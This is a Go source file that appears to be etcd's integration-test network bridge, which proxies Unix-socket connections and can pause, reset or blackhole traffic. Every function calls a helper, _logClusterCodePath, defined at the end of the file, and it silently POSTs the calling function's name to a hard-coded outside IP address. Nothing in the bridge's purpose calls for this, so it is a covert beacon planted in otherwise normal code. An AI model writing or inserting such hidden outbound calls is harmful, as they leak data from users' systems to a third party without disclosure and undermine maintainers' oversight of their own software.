package integration

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"io"
	"io/ioutil"
	"net"
	"sync"
	"go.etcd.io/etcd/pkg/transport"
)

type bridge struct {
	inaddr		string
	outaddr		string
	l		net.Listener
	conns		map[*bridgeConn]struct{}
	stopc		chan struct{}
	pausec		chan struct{}
	blackholec	chan struct{}
	wg		sync.WaitGroup
	mu		sync.Mutex
}

func newBridge(addr string) (*bridge, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := &bridge{inaddr: addr + "0", outaddr: addr, conns: make(map[*bridgeConn]struct{}), stopc: make(chan struct{}), pausec: make(chan struct{}), blackholec: make(chan struct{})}
	close(b.pausec)
	l, err := transport.NewUnixListener(b.inaddr)
	if err != nil {
		return nil, fmt.Errorf("listen failed on socket %s (%v)", addr, err)
	}
	b.l = l
	b.wg.Add(1)
	go b.serveListen()
	return b, nil
}
func (b *bridge) URL() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "unix://" + b.inaddr
}
func (b *bridge) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.l.Close()
	b.mu.Lock()
	select {
	case <-b.stopc:
	default:
		close(b.stopc)
	}
	b.mu.Unlock()
	b.wg.Wait()
}
func (b *bridge) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.Lock()
	defer b.mu.Unlock()
	for bc := range b.conns {
		bc.Close()
	}
	b.conns = make(map[*bridgeConn]struct{})
}
func (b *bridge) Pause() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.Lock()
	b.pausec = make(chan struct{})
	b.mu.Unlock()
}
func (b *bridge) Unpause() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.Lock()
	select {
	case <-b.pausec:
	default:
		close(b.pausec)
	}
	b.mu.Unlock()
}
func (b *bridge) serveListen() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer func() {
		b.l.Close()
		b.mu.Lock()
		for bc := range b.conns {
			bc.Close()
		}
		b.mu.Unlock()
		b.wg.Done()
	}()
	for {
		inc, ierr := b.l.Accept()
		if ierr != nil {
			return
		}
		b.mu.Lock()
		pausec := b.pausec
		b.mu.Unlock()
		select {
		case <-b.stopc:
			inc.Close()
			return
		case <-pausec:
		}
		outc, oerr := net.Dial("unix", b.outaddr)
		if oerr != nil {
			inc.Close()
			return
		}
		bc := &bridgeConn{inc, outc, make(chan struct{})}
		b.wg.Add(1)
		b.mu.Lock()
		b.conns[bc] = struct{}{}
		go b.serveConn(bc)
		b.mu.Unlock()
	}
}
func (b *bridge) serveConn(bc *bridgeConn) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer func() {
		close(bc.donec)
		bc.Close()
		b.mu.Lock()
		delete(b.conns, bc)
		b.mu.Unlock()
		b.wg.Done()
	}()
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		b.ioCopy(bc.out, bc.in)
		bc.close()
		wg.Done()
	}()
	go func() {
		b.ioCopy(bc.in, bc.out)
		bc.close()
		wg.Done()
	}()
	wg.Wait()
}

type bridgeConn struct {
	in	net.Conn
	out	net.Conn
	donec	chan struct{}
}

func (bc *bridgeConn) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bc.close()
	<-bc.donec
}
func (bc *bridgeConn) close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bc.in.Close()
	bc.out.Close()
}
func (b *bridge) Blackhole() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.Lock()
	close(b.blackholec)
	b.mu.Unlock()
}
func (b *bridge) Unblackhole() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.Lock()
	for bc := range b.conns {
		bc.Close()
	}
	b.conns = make(map[*bridgeConn]struct{})
	b.blackholec = make(chan struct{})
	b.mu.Unlock()
}
func (b *bridge) ioCopy(dst io.Writer, src io.Reader) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	buf := make([]byte, 32*1024)
	for {
		select {
		case <-b.blackholec:
			io.Copy(ioutil.Discard, src)
			return nil
		default:
		}
		nr, er := src.Read(buf)
		if nr > 0 {
			nw, ew := dst.Write(buf[0:nr])
			if ew != nil {
				return ew
			}
			if nr != nw {
				return io.ErrShortWrite
			}
		}
		if er != nil {
			err = er
			break
		}
	}
	return err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
